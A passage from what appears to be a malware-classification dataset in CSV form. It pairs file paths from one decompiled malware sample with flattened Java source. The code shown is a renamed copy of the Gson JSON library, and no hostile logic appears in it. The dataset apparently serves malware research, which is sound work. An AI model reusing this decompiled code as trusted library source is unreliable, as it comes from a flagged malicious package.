return this.elements.get(0).getAsByte();     }     throw new IllegalStateException();   }   @Override public char getAsCharacter(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsCharacter();     }     throw new IllegalStateException();   }   @Override public double getAsDouble(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsDouble();     }     throw new IllegalStateException();   }   @Override public float getAsFloat(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsFloat();     }     throw new IllegalStateException();   }   @Override public int getAsInt(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsInt();     }     throw new IllegalStateException();   }   @Override public long getAsLong(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsLong();     }     throw new IllegalStateException();   }   @Override public Number getAsNumber(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsNumber();     }     throw new IllegalStateException();   }   @Override public short getAsShort(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsShort();     }     throw new IllegalStateException();   }   @Override public String getAsString(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsString();     }     throw new IllegalStateException();   }   public int hashCode(){     return this.elements.hashCode();   }   @Override public Iterator<JsonElement> iterator(){     return this.elements.iterator();   }   public int size(){     return this.elements.size();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonDeserializationContext.code","public interface JsonDeserializationContext {   <T>T deserialize(  JsonElement jsonElement,  Type type); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonDeserializer.code","public interface JsonDeserializer<T> {   T deserialize(  JsonElement jsonElement,  Type type,  JsonDeserializationContext jsonDeserializationContext); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonElement.code","public abstract class JsonElement {   public abstract JsonElement deepCopy();   public BigDecimal getAsBigDecimal(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public BigInteger getAsBigInteger(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public boolean getAsBoolean(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   Boolean getAsBooleanWrapper(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public byte getAsByte(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public char getAsCharacter(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public double getAsDouble(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public float getAsFloat(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public int getAsInt(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public JsonArray getAsJsonArray(){     if (isJsonArray()) {       return (JsonArray)this;     }     throw new IllegalStateException(""This is not a JSON Array."");   }   public JsonNull getAsJsonNull(){     if (isJsonNull()) {       return (JsonNull)this;     }     throw new IllegalStateException(""This is not a JSON Null."");   }   public JsonObject getAsJsonObject(){     if (isJsonObject()) {       return (JsonObject)this;     }     throw new IllegalStateException(""Not a JSON Object: "" + this);   }   public JsonPrimitive getAsJsonPrimitive(){     if (isJsonPrimitive()) {       return (JsonPrimitive)this;     }     throw new IllegalStateException(""This is not a JSON Primitive."");   }   public long getAsLong(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public Number getAsNumber(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public short getAsShort(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public String getAsString(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public boolean isJsonArray(){     return this instanceof JsonArray;   }   public boolean isJsonNull(){     return this instanceof JsonNull;   }   public boolean isJsonObject(){     return this instanceof JsonObject;   }   public boolean isJsonPrimitive(){     return this instanceof JsonPrimitive;   }   public String toString(){     try {       StringWriter stringWriter=new StringWriter();       JsonWriter jsonWriter=new JsonWriter(stringWriter);       jsonWriter.setLenient(true);       Streams.write(this,jsonWriter);       return stringWriter.toString();     }  catch (    IOException e) {       throw new AssertionError(e);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonIOException.code","public final class JsonIOException extends JsonParseException {   private static final long serialVersionUID=1;   public JsonIOException(  String str){     super(str);   }   public JsonIOException(  String str,  Throwable th){     super(str,th);   }   public JsonIOException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonNull.code","public final class JsonNull extends JsonElement {   public static final JsonNull INSTANCE=new JsonNull();   @Deprecated public JsonNull(){   }   @Override public JsonNull deepCopy(){     return INSTANCE;   }   public boolean equals(  Object obj){     return this == obj || (obj instanceof JsonNull);   }   public int hashCode(){     return JsonNull.class.hashCode();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonObject.code","public final class JsonObject extends JsonElement {   private final LinkedTreeMap<String,JsonElement> members=new LinkedTreeMap<>();   private JsonElement createJsonElement(  Object obj){     return obj == null ? JsonNull.INSTANCE : new JsonPrimitive(obj);   }   public void add(  String str,  JsonElement jsonElement){     if (jsonElement == null) {       jsonElement=JsonNull.INSTANCE;     }     this.members.put(str,jsonElement);   }   public void addProperty(  String str,  Boolean bool){     add(str,createJsonElement(bool));   }   public void addProperty(  String str,  Character ch){     add(str,createJsonElement(ch));   }   public void addProperty(  String str,  Number number){     add(str,createJsonElement(number));   }   public void addProperty(  String str,  String str2){     add(str,createJsonElement(str2));   }   @Override public JsonObject deepCopy(){     JsonObject jsonObject=new JsonObject();     for (    Map.Entry<String,JsonElement> entry : this.members.entrySet()) {       jsonObject.add(entry.getKey(),entry.getValue().deepCopy());     }     return jsonObject;   }   public Set<Map.Entry<String,JsonElement>> entrySet(){     return this.members.entrySet();   }   public boolean equals(  Object obj){     return obj == this || ((obj instanceof JsonObject) && ((JsonObject)obj).members.equals(this.members));   }   public JsonElement get(  String str){     return this.members.get(str);   }   public JsonArray getAsJsonArray(  String str){     return (JsonArray)this.members.get(str);   }   public JsonObject getAsJsonObject(  String str){     return (JsonObject)this.members.get(str);   }   public JsonPrimitive getAsJsonPrimitive(  String str){     return (JsonPrimitive)this.members.get(str);   }   public boolean has(  String str){     return this.members.containsKey(str);   }   public int hashCode(){     return this.members.hashCode();   }   public JsonElement remove(  String str){     return this.members.remove(str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonParseException.code","public class JsonParseException extends RuntimeException {   static final long serialVersionUID=-4086729973971783390L;   public JsonParseException(  String str){     super(str);   }   public JsonParseException(  String str,  Throwable th){     super(str,th);   }   public JsonParseException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonParser.code","public final class JsonParser {   public JsonElement parse(  JsonReader jsonReader){     boolean isLenient=jsonReader.isLenient();     jsonReader.setLenient(true);     try {       try {         try {           return Streams.parse(jsonReader);         }  catch (        OutOfMemoryError e) {           throw new JsonParseException(""Failed parsing JSON source: "" + jsonReader + "" to Json"",e);         }       }  catch (      StackOverflowError e2) {         throw new JsonParseException(""Failed parsing JSON source: "" + jsonReader + "" to Json"",e2);       }     }   finally {       jsonReader.setLenient(isLenient);     }   }   public JsonElement parse(  Reader reader){     try {       JsonReader jsonReader=new JsonReader(reader);       JsonElement parse=parse(jsonReader);       if (parse.isJsonNull() || jsonReader.peek() == JsonToken.END_DOCUMENT) {         return parse;       }       throw new JsonSyntaxException(""Did not consume the entire document."");     }  catch (    MalformedJsonException e) {       throw new JsonSyntaxException(e);     } catch (    IOException e2) {       throw new JsonIOException(e2);     } catch (    NumberFormatException e3) {       throw new JsonSyntaxException(e3);     }   }   public JsonElement parse(  String str){     return parse(new StringReader(str));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonPrimitive.code","public final class JsonPrimitive extends JsonElement {   private static final Class<?>[] PRIMITIVE_TYPES={Integer.TYPE,Long.TYPE,Short.TYPE,Float.TYPE,Double.TYPE,Byte.TYPE,Boolean.TYPE,Character.TYPE,Integer.class,Long.class,Short.class,Float.class,Double.class,Byte.class,Boolean.class,Character.class};   private Object value;   public JsonPrimitive(  Boolean bool){     setValue(bool);   }   public JsonPrimitive(  Character ch){     setValue(ch);   }   public JsonPrimitive(  Number number){     setValue(number);   }   public JsonPrimitive(  Object obj){     setValue(obj);   }   public JsonPrimitive(  String str){     setValue(str);   }   private static boolean isIntegral(  JsonPrimitive jsonPrimitive){     if (!(jsonPrimitive.value instanceof Number)) {       return false;     }     Number number=(Number)jsonPrimitive.value;     return (number instanceof BigInteger) || (number instanceof Long) || (number instanceof Integer)|| (number instanceof Short)|| (number instanceof Byte);   }   private static boolean isPrimitiveOrString(  Object obj){     if (obj instanceof String) {       return true;     }     Class<?> cls=obj.getClass();     for (    Class<?> cls2 : PRIMITIVE_TYPES) {       if (cls2.isAssignableFrom(cls)) {         return true;       }     }     return false;   }   @Override public JsonPrimitive deepCopy(){     return this;   }   public boolean equals(  Object obj){     boolean z=false;     if (this == obj) {       return true;     }     if (obj == null || getClass() != obj.getClass()) {       return false;     }     JsonPrimitive jsonPrimitive=(JsonPrimitive)obj;     if (this.value == null) {       return jsonPrimitive.value == null;     }     if (isIntegral(this) && isIntegral(jsonPrimitive)) {       return getAsNumber().longValue() == jsonPrimitive.getAsNumber().longValue();     }     if (!(this.value instanceof Number) || !(jsonPrimitive.value instanceof Number)) {       return this.value.equals(jsonPrimitive.value);     }     double doubleValue=getAsNumber().doubleValue();     double doubleValue2=jsonPrimitive.getAsNumber().doubleValue();     if (doubleValue == doubleValue2 || (Double.isNaN(doubleValue) && Double.isNaN(doubleValue2))) {       z=true;     }     return z;   }   @Override public BigDecimal getAsBigDecimal(){     return this.value instanceof BigDecimal ? (BigDecimal)this.value : new BigDecimal(this.value.toString());   }   @Override public BigInteger getAsBigInteger(){     return this.value instanceof BigInteger ? (BigInteger)this.value : new BigInteger(this.value.toString());   }   @Override public boolean getAsBoolean(){     return isBoolean() ? getAsBooleanWrapper().booleanValue() : Boolean.parseBoolean(getAsString());   }   @Override Boolean getAsBooleanWrapper(){     return (Boolean)this.value;   }   @Override public byte getAsByte(){     return isNumber() ? getAsNumber().byteValue() : Byte.parseByte(getAsString());   }   @Override public char getAsCharacter(){     return getAsString().charAt(0);   }   @Override public double getAsDouble(){     return isNumber() ? getAsNumber().doubleValue() : Double.parseDouble(getAsString());   }   @Override public float getAsFloat(){     return isNumber() ? getAsNumber().floatValue() : Float.parseFloat(getAsString());   }   @Override public int getAsInt(){     return isNumber() ? getAsNumber().intValue() : Integer.parseInt(getAsString());   }   @Override public long getAsLong(){     return isNumber() ? getAsNumber().longValue() : Long.parseLong(getAsString());   }   @Override public Number getAsNumber(){     return this.value instanceof String ? new LazilyParsedNumber((String)this.value) : (Number)this.value;   }   @Override public short getAsShort(){     return isNumber() ? getAsNumber().shortValue() : Short.parseShort(getAsString());   }   @Override public String getAsString(){     return isNumber() ? getAsNumber().toString() : isBoolean() ? getAsBooleanWrapper().toString() : (String)this.value;   }   public int hashCode(){     if (this.value == null) {       return 31;     }     if (isIntegral(this)) {       long longValue=getAsNumber().longValue();       return (int)(longValue ^ (longValue >>> 32));     }     if (!(this.value instanceof Number)) {       return this.value.hashCode();     }     long doubleToLongBits=Double.doubleToLongBits(getAsNumber().doubleValue());     return (int)(doubleToLongBits ^ (doubleToLongBits >>> 32));   }   public boolean isBoolean(){     return this.value instanceof Boolean;   }   public boolean isNumber(){     return this.value instanceof Number;   }   public boolean isString(){     return this.value instanceof String;   }   void setValue(  Object obj){     if (obj instanceof Character) {       this.value=String.valueOf(((Character)obj).charValue());     }  else {       C$Gson$Preconditions.checkArgument((obj instanceof Number) || isPrimitiveOrString(obj));       this.value=obj;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonSerializationContext.code","public interface JsonSerializationContext {   JsonElement serialize(  Object obj);   JsonElement serialize(  Object obj,  Type type); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonSerializer.code","public interface JsonSerializer<T> {   JsonElement serialize(  T t,  Type type,  JsonSerializationContext jsonSerializationContext); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonStreamParser.code","public final class JsonStreamParser implements Iterator<JsonElement> {   private final Object lock;   private final JsonReader parser;   public JsonStreamParser(  Reader reader){     this.parser=new JsonReader(reader);     this.parser.setLenient(true);     this.lock=new Object();   }   public JsonStreamParser(  String str){     this(new StringReader(str));   }   @Override public boolean hasNext(){     boolean z; synchronized (this.lock) {       try {         z=this.parser.peek() != JsonToken.END_DOCUMENT;       }  catch (      MalformedJsonException e) {         throw new JsonSyntaxException(e);       } catch (      IOException e2) {         throw new JsonIOException(e2);       }     }     return z;   }   @Override public JsonElement next(){     if (!hasNext()) {       throw new NoSuchElementException();     }     try {       return Streams.parse(this.parser);     }  catch (    JsonParseException e) {       if (e.getCause() instanceof EOFException) {         throw new NoSuchElementException();       }       throw e;     } catch (    OutOfMemoryError e2) {       throw new JsonParseException(""Failed parsing JSON source to Json"",e2);     } catch (    StackOverflowError e3) {       throw new JsonParseException(""Failed parsing JSON source to Json"",e3);     }   }   @Override public void remove(){     throw new UnsupportedOperationException();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonSyntaxException.code","public final class JsonSyntaxException extends JsonParseException {   private static final long serialVersionUID=1;   public JsonSyntaxException(  String str){     super(str);   }   public JsonSyntaxException(  String str,  Throwable th){     super(str,th);   }   public JsonSyntaxException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\packageinfo.code","interface packageinfo { } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\SingleTypeFactory.code","public class SingleTypeFactory implements TypeAdapterFactory {   private final JsonDeserializer<?> deserializer;   private final TypeToken<?> exactType;   private final Class<?> hierarchyType;   private final boolean matchRawType;   private final JsonSerializer<?> serializer;   private SingleTypeFactory(  Object obj,  TypeToken<?> typeToken,  boolean z,  Class<?> cls){     this.serializer=obj instanceof JsonSerializer ? (JsonSerializer)obj : null;     this.deserializer=obj instanceof JsonDeserializer ? (JsonDeserializer)obj : null;     C$Gson$Preconditions.checkArgument((this.serializer == null && this.deserializer == null) ? false : true);     this.exactType=typeToken;     this.matchRawType=z;     this.hierarchyType=cls;   }   @Override public <T>TypeAdapter<T> create(  Gson gson,  TypeToken<T> typeToken){     if (this.exactType != null ? this.exactType.equals(typeToken) || (this.matchRawType && this.exactType.getType() == typeToken.getRawType()) : this.hierarchyType.isAssignableFrom(typeToken.getRawType())) {       return new TreeTypeAdapter(this.serializer,this.deserializer,gson,typeToken,this);     }     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\TreeTypeAdapter.code","public final class TreeTypeAdapter<T> extends TypeAdapter<T> {   private TypeAdapter<T> delegate;   private final JsonDeserializer<T> deserializer;   private final Gson gson;   private final JsonSerializer<T> serializer;   private final TypeAdapterFactory skipPast;   private final TypeToken<T> typeToken; public class SingleTypeFactory implements TypeAdapterFactory {     private final JsonDeserializer<?> deserializer;     private final TypeToken<?> exactType;     private final Class<?> hierarchyType;     private final boolean matchRawType;     private final JsonSerializer<?> serializer;     private SingleTypeFactory(    Object obj,    TypeToken<?> typeToken,    boolean z,    Class<?> cls){       this.serializer=obj instanceof JsonSerializer ? (JsonSerializer)obj : null;       this.deserializer=obj instanceof JsonDeserializer ? (JsonDeserializer)obj : null;       C$Gson$Preconditions.checkArgument((this.serializer == null && this.deserializer == null) ? false : true);       this.exactType=typeToken;       this.matchRawType=z;       this.hierarchyType=cls;     }     @Override public <T>TypeAdapter<T> create(    Gson gson,    TypeToken<T> typeToken){       if (this.exactType != null ? this.exactType.equals(typeToken) || (this.matchRawType && this.exactType.getType() == typeToken.getRawType()) : this.hierarchyType.isAssignableFrom(typeToken.getRawType())) {         return new TreeTypeAdapter(this.serializer,this.deserializer,gson,typeToken,this);       }       return null;     }   }   private TreeTypeAdapter(  JsonSerializer<T> jsonSerializer,  JsonDeserializer<T> jsonDeserializer,  Gson gson,  TypeToken<T> typeToken,  TypeAdapterFactory typeAdapterFactory){     this.serializer=jsonSerializer;     this.deserializer=jsonDeserializer;     this.gson=gson;     this.typeToken=typeToken;     this.skipPast=typeAdapterFactory;   }   private TypeAdapter<T> delegate(){     TypeAdapter<T> typeAdapter=this.delegate;     if (typeAdapter != null) {       return typeAdapter;     }     TypeAdapter<T> delegateAdapter=this.gson.getDelegateAdapter(this.skipPast,this.typeToken);     this.delegate=delegateAdapter;     return delegateAdapter;   }   public static TypeAdapterFactory newFactory(  TypeToken<?> typeToken,  Object obj){     return new SingleTypeFactory(obj,typeToken,false,null);   }   public static TypeAdapterFactory newFactoryWithMatchRawType(  TypeToken<?> typeToken,  Object obj){     return new SingleTypeFactory(obj,typeToken,typeToken.getType() == typeToken.getRawType(),null);   }   public static TypeAdapterFactory newTypeHierarchyFactory(  Class<?> cls,  Object obj){     return new SingleTypeFactory(obj,null,false,cls);   }   @Override public T read(  JsonReader jsonReader){     if (this.deserializer == null) {       return delegate().read(jsonReader);     }     JsonElement parse=Streams.parse(jsonReader);     if (parse.isJsonNull()) {       return null;     }     return this.deserializer.deserialize(parse,this.typeToken.getType(),this.gson.deserializationContext);   }   @Override public void write(  JsonWriter jsonWriter,  T t){     if (this.serializer == null) {       delegate().write(jsonWriter,t);     }  else     if (t == null) {       jsonWriter.nullValue();     }  else {       Streams.write(this.serializer.serialize(t,this.typeToken.getType(),this.gson.serializationContext),jsonWriter);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\TypeAdapter.code","public abstract class TypeAdapter<T> {   public final T fromJson(  Reader reader){     return read(new JsonReader(reader));   }   public final T fromJson(  String str){     return fromJson(new StringReader(str));   }   public final T fromJsonTree(  JsonElement jsonElement){     try {       return read(new JsonTreeReader(jsonElement));     }  catch (    IOException e) {       throw new JsonIOException(e);     }   }   public final TypeAdapter<T> nullSafe(){     return new TypeAdapter<T>(){       @Override public T read(      JsonReader jsonReader){         if (jsonReader.peek() != JsonToken.NULL) {           return (T)TypeAdapter.this.read(jsonReader);         }         jsonReader.nextNull();         return null;       }       @Override public void write(      JsonWriter jsonWriter,      T t){         if (t == null) {           jsonWriter.nullValue();         }  else {           TypeAdapter.this.write(jsonWriter,t);         }       }     } ;   }   public abstract T read(  JsonReader jsonReader);   public final String toJson(  T t){     StringWriter stringWriter=new StringWriter();     toJson(stringWriter,t);     return stringWriter.toString();   }   public final void toJson(  Writer writer,  T t){     write(new JsonWriter(writer),t);   }   public final JsonElement toJsonTree(  T t){     try {       JsonTreeWriter jsonTreeWriter=new JsonTreeWriter();       write(jsonTreeWriter,t);       return jsonTreeWriter.get();     }  catch (    IOException e) {       throw new JsonIOException(e);     }   }   public abstract void write(  JsonWriter jsonWriter,  T t); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\TypeAdapterFactory.code","public interface TypeAdapterFactory {   <T>TypeAdapter<T> create(  Gson gson,  TypeToken<T> typeToken); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.annotations\packageinfo.code","interface packageinfo { } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\AppendableWriter.code","final class AppendableWriter extends Writer {   private final Appendable appendable;   private final CurrentWrite currentWrite; class CurrentWrite implements CharSequence {     char[] chars;     CurrentWrite(){     }     @Override public char charAt(    int i){       return this.chars[i];     }     @Override public int length(){       return this.chars.length;     }     @Override public CharSequence subSequence(    int i,    int i2){       return new String(this.chars,i,i2 - i);     }   }   private AppendableWriter(  Appendable appendable){     this.currentWrite=new CurrentWrite();     this.appendable=appendable;   }   @Override public void close(){   }   @Override public void flush(){   }   @Override public void write(  int i){     this.appendable.append((char)i);   }   @Override public void write(  char[] cArr,  int i,  int i2){     this.currentWrite.chars=cArr;     this.appendable.append(this.currentWrite,i,i + i2);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\C$Gson$Preconditions.code","public final class C$Gson$Preconditions {   public static void checkArgument(  boolean z){     if (!z) {       throw new IllegalArgumentException();     }   }   public static <T>T checkNotNull(  T t){     if (t == null) {       throw new NullPointerException();     }     return t;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\C$Gson$Types.code","public final class C$Gson$Types {   static final Type[] EMPTY_TYPE_ARRAY=new Type[0]; public final class GenericArrayTypeImpl implements Serializable, GenericArrayType {     private static final long serialVersionUID=0;     private final Type componentType;     public GenericArrayTypeImpl(    Type type){       this.componentType=C$Gson$Types.canonicalize(type);     }     public boolean equals(    Object obj){       return (obj instanceof GenericArrayType) && C$Gson$Types.equals(this,(GenericArrayType)obj);     }     @Override public Type getGenericComponentType(){       return this.componentType;     }     public int hashCode(){       return this.componentType.hashCode();     }     public String toString(){       return C$Gson$Types.typeToString(this.componentType) + ""[]"";     }   } public final class ParameterizedTypeImpl implements Serializable, ParameterizedType {     private static final long serialVersionUID=0;     private final Type ownerType;     private final Type rawType;     private final Type[] typeArguments;     public ParameterizedTypeImpl(    Type type,    Type type2,    Type... typeArr){       boolean z=true;       if (type2 instanceof Class) {         Class cls=(Class)type2;         C$Gson$Preconditions.checkArgument(type != null || cls.getEnclosingClass() == null);         if (type != null && cls.getEnclosingClass() == null) {           z=false;         }         C$Gson$Preconditions.checkArgument(z);       }       this.ownerType=type == null ? null : C$Gson$Types.canonicalize(type);       this.rawType=C$Gson$Types.canonicalize(type2);       this.typeArguments=(Type[])typeArr.clone();       for (int i=0; i < this.typeArguments.length; i++) {         C$Gson$Preconditions.checkNotNull(this.typeArguments[i]);         C$Gson$Types.checkNotPrimitive(this.typeArguments[i]);         this.typeArguments[i]=C$Gson$Types.canonicalize(this.typeArguments[i]);       }     }     public boolean equals(    Object obj){       return (obj instanceof ParameterizedType) && C$Gson$Types.equals(this,(ParameterizedType)obj);     }     @Override public Type[] getActualTypeArguments(){       return (Type[])this.typeArguments.clone();     }     @Override public Type getOwnerType(){       return this.ownerType;     }     @Override public Type getRawType(){       return this.rawType;     }     public int hashCode(){       return (Arrays.hashCode(this.typeArguments) ^ this.rawType.hashCode()) ^ C$Gson$Types.hashCodeOrZero(this.ownerType);     }     public String toString(){       StringBuilder sb=new StringBuilder((this.typeArguments.length + 1) * 30);       sb.append(C$Gson$Types.typeToString(this.rawType));       if (this.typeArguments.length == 0) {         return sb.toString();       }       sb.append(""<"").append(C$Gson$Types.typeToString(this.typeArguments[0]));       for (int i=1; i < this.typeArguments.length; i++) {         sb.append("", "").append(C$Gson$Types.typeToString(this.typeArguments[i]));       }       return sb.append("">"").toString();     }   } public final class WildcardTypeImpl implements Serializable, WildcardType {     private static final long serialVersionUID=0;     private final Type lowerBound;     private final Type upperBound;     public WildcardTypeImpl(    Type[] typeArr,    Type[] typeArr2){       C$Gson$Preconditions.checkArgument(typeArr2.length <= 1);       C$Gson$Preconditions.checkArgument(typeArr.length == 1);       if (typeArr2.length != 1) {         C$Gson$Preconditions.checkNotNull(typeArr[0]);         C$Gson$Types.checkNotPrimitive(typeArr[0]);         this.lowerBound=null;         this.upperBound=C$Gson$Types.canonicalize(typeArr[0]);         return;       }       C$Gson$Preconditions.checkNotNull(typeArr2[0]);       C$Gson$Types.checkNotPrimitive(typeArr2[0]);       C$Gson$Preconditions.checkArgument(typeArr[0] == Object.class);       this.lowerBound=C$Gson$Types.canonicalize(typeArr2[0]);       this.upperBound=Object.class;     }     public boolean equals(    Object obj){       return (obj instanceof WildcardType) && C$Gson$Types.equals(this,(WildcardType)obj);     }     @Override public Type[] getLowerBounds(){       return this.lowerBound != null ? new Type[]{this.lowerBound} : C$Gson$Types.EMPTY_TYPE_ARRAY;     }     @Override public Type[] getUpperBounds(){       return new Type[]{this.upperBound};     }     public int hashCode(){       return (this.lowerBound != null ? this.lowerBound.hashCode() + 31 : 1) ^ (this.upperBound.hashCode() + 31);     }     public String toString(){       return this.lowerBound != null ? ""? super "" + C$Gson$Types.typeToString(this.lowerBound) : this.upperBound == Object.class ? ""?"" : ""? extends "" + C$Gson$Types.typeToString(this.upperBound);     }   }   private C$Gson$Types(){   }   public static GenericArrayType arrayOf(  Type type){     return new GenericArrayTypeImpl(type);   }   public static Type canonicalize(  Type type){     if (type instanceof Class) {       Class cls=(Class)type;       return cls.isArray() ? new GenericArrayTypeImpl(canonicalize(cls.getComponentType())) : cls;     }     if (type instanceof ParameterizedType) {       ParameterizedType parameterizedType=(ParameterizedType)type;       return new ParameterizedTypeImpl(parameterizedType.getOwnerType(),parameterizedType.getRawType(),parameterizedType.getActualTypeArguments());     }     if (type instanceof GenericArrayType) {       return new GenericArrayTypeImpl(((GenericArrayType)type).getGenericComponentType());     }     if (!(type instanceof WildcardType)) {       return type;     }     WildcardType wildcardType=(WildcardType)type;     return new WildcardTypeImpl(wildcardType.getUpperBounds(),wildcardType.getLowerBounds());   }   public static void checkNotPrimitive(  Type type){     C$Gson$Preconditions.checkArgument(((type instanceof Class) && ((Class)type).isPrimitive()) ? false : true);   }   private static Class<?> declaringClassOf(  TypeVariable<?> typeVariable){     Object genericDeclaration=typeVariable.getGenericDeclaration();     if (genericDeclaration instanceof Class) {       return (Class)genericDeclaration;     }     return null;   }   static boolean equal(  Object obj,  Object obj2){     return obj == obj2 || (obj != null && obj.equals(obj2));   }   public static boolean equals(  Type type,  Type type2){     if (type == type2) {       return true;     }     if (type instanceof Class) {       return type.equals(type2);     }     if (type instanceof ParameterizedType) {       if (!(type2 instanceof ParameterizedType)) {         return false;       }       ParameterizedType parameterizedType=(ParameterizedType)type;       ParameterizedType parameterizedType2=(ParameterizedType)type2;       return equal(parameterizedType.getOwnerType(),parameterizedType2.getOwnerType()) && parameterizedType.getRawType().equals(parameterizedType2.getRawType()) && Arrays.equals(parameterizedType.getActualTypeArguments(),parameterizedType2.getActualTypeArguments());     }     if (type instanceof GenericArrayType) {       if (type2 instanceof GenericArrayType) {         return equals(((GenericArrayType)type).getGenericComponentType(),((GenericArrayType)type2).getGenericComponentType());       }       return false;     }     if (type instanceof WildcardType) {       if (!(type2 instanceof WildcardType)) {         return false;       }       WildcardType wildcardType=(WildcardType)type;       WildcardType wildcardType2=(WildcardType)type2;       return Arrays.equals(wildcardType.getUpperBounds(),wildcardType2.getUpperBounds()) && Arrays.equals(wildcardType.getLowerBounds(),wildcardType2.getLowerBounds());     }     if (!(type instanceof TypeVariable) || !(type2 instanceof TypeVariable)) {       return false;     }     TypeVariable typeVariable=(TypeVariable)type;     TypeVariable typeVariable2=(TypeVariable)type2;     return typeVariable.getGenericDeclaration() == typeVariable2.getGenericDeclaration() && typeVariable.getName().equals(typeVariable2.getName());   }   public static Type getArrayComponentType(  Type type){     return type instanceof GenericArrayType ? ((GenericArrayType)type).getGenericComponentType() : ((Class)type).getComponentType();   }   public static Type getCollectionElementType(  Type type,  Class<?> cls){     Type supertype=getSupertype(type,cls,Collection.class);     if (supertype instanceof WildcardType) {       supertype=((WildcardType)supertype).getUpperBounds()[0];     }     return supertype instanceof ParameterizedType ? ((ParameterizedType)supertype).getActualTypeArguments()[0] : Object.class;   }   static Type getGenericSupertype(  Type type,  Class<?> cls,  Class<?> cls2){     if (cls2 == cls) {       return type;     }     if (cls2.isInterface()) {       Class<?>[] interfaces=cls.getInterfaces();       int length=interfaces.length;       for (int i=0; i < length; i++) {         if (interfaces[i] == cls2) {           return cls.getGenericInterfaces()[i];         }         if (cls2.isAssignableFrom(interfaces[i])) {           return getGenericSupertype(cls.getGenericInterfaces()[i],interfaces[i],cls2);         }       }     }     if (!cls.isInterface()) {       while (cls != Object.class) {         Class<? super Object> superclass=cls.getSuperclass();         if (superclass == cls2) {           return cls.getGenericSuperclass();         }         if (cls2.isAssignableFrom(superclass)) {           return getGenericSupertype(cls.getGenericSuperclass(),superclass,cls2);         }         cls=superclass;       }     }     return cls2;   }   public static Type[] getMapKeyAndValueTypes(  Type type,  Class<?> 